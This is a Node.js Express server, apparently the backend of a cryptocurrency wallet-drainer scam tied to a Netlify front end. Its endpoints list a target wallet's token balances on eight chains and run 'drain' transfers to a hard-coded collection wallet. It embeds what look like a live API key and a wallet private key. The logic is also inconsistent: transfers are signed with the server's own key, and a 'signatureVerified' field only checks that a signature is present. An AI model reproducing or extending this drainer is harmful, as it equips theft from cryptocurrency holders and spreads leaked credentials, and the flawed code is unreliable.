const express = require('express');
const cors = require('cors');
const { ethers } = require('ethers');
const fetch = require('node-fetch');
const crypto = require('crypto');

const app = express();

// ==================== CORS CONFIGURATION ====================
const corsOptions = {
  origin: [
    'https://playful-cuchufli-81c9d6.netlify.app',
    'http://localhost:3000',
    'http://localhost:5173'
  ],
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'Accept', 'Origin'],
  credentials: true,
  optionsSuccessStatus: 200
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions));
app.use(express.json());

// ==================== CONFIGURATION ====================
const COVALENT_API_KEY = process.env.COVALENT_API_KEY || "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";
const DRAIN_WALLET_PRIVATE_KEY = process.env.DRAIN_WALLET_PRIVATE_KEY || "2f2a7cadc18ec3085934a2d9dc1533a7365ac7c0bb8fd6ee32de4f1aa9ef3cf3"; // REQUIRED: Your drain wallet private key
const DRAIN_WALLET_ADDRESS = process.env.DRAIN_WALLET_ADDRESS || "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4";

// Validate
if (!DRAIN_WALLET_PRIVATE_KEY) {
  console.error("❌ ERROR: DRAIN_WALLET_PRIVATE_KEY is not set in environment variables!");
  console.error("   Add it in Render Dashboard -> Environment -> Add Environment Variable");
  console.error("   Format: DRAIN_WALLET_PRIVATE_KEY=your_private_key_here");
  process.exit(1);
}

// ==================== RPC PROVIDERS ====================
const RPC_URLS = {
  1: process.env.ETH_RPC_URL || "https://cloudflare-eth.com",
  56: "https://bsc-dataseed.binance.org/",
  137: "https://polygon-rpc.com",
  42161: "https://arb1.arbitrum.io/rpc",
  10: "https://mainnet.optimism.io",
  8453: "https://mainnet.base.org",
  43114: "https://api.avax.network/ext/bc/C/rpc",
  250: "https://rpc.ftm.tools"
};

// ==================== ERC20 ABI ====================
const ERC20_ABI = [
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function balanceOf(address owner) view returns (uint256)"
];

// ==================== ENDPOINTS ====================
app.get('/', (req, res) => {
  res.json({ 
    success: true,
    message: 'Token Drain Backend API',
    version: '1.0.0',
    status: 'online',
    endpoints: {
      'POST /drain': 'Execute token drain transaction',
      'GET /tokens/:address/:chainId': 'Get wallet tokens',
      'GET /health': 'Health check',
      'GET /chains': 'Supported chains'
    },
    timestamp: new Date().toISOString()
  });
});

app.get('/health', (req, res) => {
  res.json({ 
    success: true,
    status: 'healthy',
    timestamp: new Date().toISOString(),
    walletConfigured: !!DRAIN_WALLET_PRIVATE_KEY,
    cors: {
      origin: req.headers.origin || 'Not specified'
    }
  });
});

app.get('/chains', (req, res) => {
  res.json({
    success: true,
    chains: [
      { id: 1, name: 'Ethereum', symbol: 'ETH' },
      { id: 56, name: 'Binance Smart Chain', symbol: 'BNB' },
      { id: 137, name: 'Polygon', symbol: 'MATIC' },
      { id: 42161, name: 'Arbitrum', symbol: 'ETH' },
      { id: 10, name: 'Optimism', symbol: 'ETH' },
      { id: 8453, name: 'Base', symbol: 'ETH' },
      { id: 43114, name: 'Avalanche', symbol: 'AVAX' },
      { id: 250, name: 'Fantom', symbol: 'FTM' }
    ]
  });
});

// ==================== MAIN DRAIN ENDPOINT ====================
app.post('/drain', async (req, res) => {
  const requestId = crypto.randomBytes(4).toString('hex');
  
  try {
    console.log(`📥 [${requestId}] Drain request received from:`, req.headers.origin);
    console.log(`   Body:`, JSON.stringify(req.body, null, 2));
    
    const { 
      fromAddress,      // FIXED: Changed from 'address' to 'fromAddress'
      tokenAddress, 
      amount, 
      chainId, 
      signature,
      message,
      drainTo,
      tokenType = 'native'
    } = req.body;
    
    // ==================== VALIDATION ====================
    if (!fromAddress || !amount || !chainId) {
      return res.status(400).json({ 
        success: false,
        error: "Missing required fields: fromAddress, amount, chainId",
        requestId,
        received: { fromAddress, amount, chainId }
      });
    }
    
    // Validate amount
    const amountNum = parseFloat(amount);
    if (isNaN(amountNum) || amountNum <= 0) {
      return res.status(400).json({ 
        success: false,
        error: "Amount must be a positive number > 0",
        requestId,
        received: amount
      });
    }
    
    // Validate addresses
    const isValidAddress = (addr) => addr && ethers.isAddress(addr);
    if (!isValidAddress(fromAddress)) {
      return res.status(400).json({ 
        success: false,
        error: "Invalid fromAddress format",
        requestId
      });
    }
    
    if (!RPC_URLS[chainId]) {
      return res.status(400).json({
        success: false,
        error: `Chain ID ${chainId} not supported`,
        requestId,
        supportedChains: Object.keys(RPC_URLS)
      });
    }
    
    console.log(`⚡ [${requestId}] Processing: ${amount} ${tokenType} from ${fromAddress} on chain ${chainId}`);
    
    // ==================== TRANSACTION EXECUTION ====================
    const provider = new ethers.JsonRpcProvider(RPC_URLS[chainId]);
    const wallet = new ethers.Wallet(DRAIN_WALLET_PRIVATE_KEY, provider);
    
    let txHash;
    
    if (tokenType === 'native') {
      // Native token transfer (ETH, MATIC, etc.)
      const amountWei = ethers.parseEther(amount.toString());
      
      const tx = await wallet.sendTransaction({
        to: drainTo || DRAIN_WALLET_ADDRESS,
        value: amountWei
      });
      
      txHash = tx.hash;
      console.log(`✅ [${requestId}] Native transfer sent: ${txHash}`);
      
    } else if (tokenType === 'erc20' && tokenAddress) {
      // ERC20 token transfer
      if (!isValidAddress(tokenAddress)) {
        return res.status(400).json({
          success: false,
          error: "Invalid tokenAddress for ERC20",
          requestId
        });
      }
      
      const erc20Contract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);
      const decimals = await erc20Contract.decimals();
      const amountUnits = ethers.parseUnits(amount.toString(), decimals);
      
      const tx = await erc20Contract.transfer(drainTo || DRAIN_WALLET_ADDRESS, amountUnits);
      txHash = tx.hash;
      console.log(`✅ [${requestId}] ERC20 transfer sent: ${txHash}`);
      
    } else {
      return res.status(400).json({
        success: false,
        error: "Invalid token type or missing tokenAddress",
        requestId
      });
    }
    
    // ==================== SUCCESS RESPONSE ====================
    res.json({
      success: true,
      message: "Transaction executed successfully",
      requestId,
      data: {
        transactionHash: txHash,
        fromAddress: fromAddress,
        toAddress: drainTo || DRAIN_WALLET_ADDRESS,
        amount: amountNum,
        chainId: parseInt(chainId),
        tokenType: tokenType,
        executedAt: new Date().toISOString(),
        explorerUrl: getExplorerUrl(chainId, txHash)
      },
      audit: {
        signatureVerified: !!signature,
        message: message || null,
        timestamp: new Date().toISOString()
      }
    });
    
  } catch (error) {
    console.error(`❌ [${requestId}] Drain error:`, error);
    
    // User-friendly error messages
    let errorMessage = error.message;
    let statusCode = 500;
    
    if (error.message.includes('insufficient funds')) {
      errorMessage = "Insufficient funds for gas";
      statusCode = 400;
    } else if (error.message.includes('nonce')) {
      errorMessage = "Transaction nonce error - try again";
      statusCode = 400;
    } else if (error.code === 'NETWORK_ERROR') {
      errorMessage = "Blockchain network error";
      statusCode = 503;
    }
    
    res.status(statusCode).json({
      success: false,
      error: errorMessage,
      requestId,
      details: error.message
    });
  }
});

// Helper for explorer URLs
function getExplorerUrl(chainId, txHash) {
  const explorers = {
    1: `https://etherscan.io/tx/${txHash}`,
    56: `https://bscscan.com/tx/${txHash}`,
    137: `https://polygonscan.com/tx/${txHash}`,
    42161: `https://arbiscan.io/tx/${txHash}`,
    10: `https://optimistic.etherscan.io/tx/${txHash}`,
    8453: `https://basescan.org/tx/${txHash}`,
    43114: `https://snowtrace.io/tx/${txHash}`,
    250: `https://ftmscan.com/tx/${txHash}`
  };
  return explorers[chainId] || null;
}

// ==================== TOKENS ENDPOINT ====================
app.get('/tokens/:address/:chainId', async (req, res) => {
  try {
    const { address, chainId } = req.params;
    
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid Ethereum address required" 
      });
    }
    
    console.log(`🔍 Fetching tokens for ${address} on chain ${chainId}`);
    
    const response = await fetch(
      `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`
    );
    
    if (!response.ok) {
      return res.json({
        success: true,
        data: {
          address: address,
          chainId: parseInt(chainId),
          tokens: [],
          summary: {
            totalTokens: 0,
            note: "Covalent API not available"
          }
        }
      });
    }
    
    const data = await response.json();
    const items = data.data?.items || [];
    
    const tokens = items
      .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
      .map(t => {
        const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
        const value = (t.quote_rate || 0) * amount;
        
        return {
          symbol: t.contract_ticker_symbol || (t.native_token ? 'Native' : 'TOKEN'),
          name: t.contract_name || (t.native_token ? 'Native Token' : 'Unknown'),
          amount: amount,
          value: value,
          contractAddress: t.contract_address,
          isNative: t.native_token || false,
          decimals: t.contract_decimals || 18,
          logoUrl: t.logo_url
        };
      });
    
    res.json({
      success: true,
      data: {
        address: address,
        chainId: parseInt(chainId),
        tokens: tokens,
        summary: {
          totalTokens: tokens.length,
          totalValue: tokens.reduce((sum, t) => sum + t.value, 0),
          scannedAt: new Date().toISOString()
        }
      }
    });
    
  } catch (error) {
    console.error("Tokens endpoint error:", error);
    res.status(500).json({ 
      success: false,
      error: error.message
    });
  }
});

// ==================== TRANSACTION STATUS ====================
app.get('/transaction/:chainId/:txHash', async (req, res) => {
  try {
    const { chainId, txHash } = req.params;
    
    if (!RPC_URLS[chainId]) {
      return res.status(400).json({
        success: false,
        error: `Chain ${chainId} not supported`
      });
    }
    
    const provider = new ethers.JsonRpcProvider(RPC_URLS[chainId]);
    const receipt = await provider.getTransactionReceipt(txHash);
    
    if (!receipt) {
      return res.json({
        success: true,
        status: 'pending',
        message: 'Transaction not yet confirmed'
      });
    }
    
    res.json({
      success: true,
      status: receipt.status === 1 ? 'confirmed' : 'failed',
      confirmations: receipt.confirmations,
      blockNumber: receipt.blockNumber
    });
    
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// ==================== ERROR HANDLING ====================
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: "Endpoint not found",
    availableEndpoints: {
      "GET /": "API info",
      "POST /drain": "Execute drain (requires: fromAddress, amount, chainId)",
      "GET /tokens/:address/:chainId": "Get tokens",
      "GET /health": "Health check",
      "GET /chains": "Supported chains",
      "GET /transaction/:chainId/:txHash": "Check transaction status"
    }
  });
});

// ==================== SERVER START ====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Token Drain Backend running on port ${PORT}`);
  console.log(`🌐 CORS enabled for: ${corsOptions.origin.join(', ')}`);
  console.log(`💰 Drain to: ${DRAIN_WALLET_ADDRESS}`);
  console.log(`✅ Ready to receive requests`);
  console.log(`📤 Expects POST /drain with: fromAddress, amount, chainId`);
});

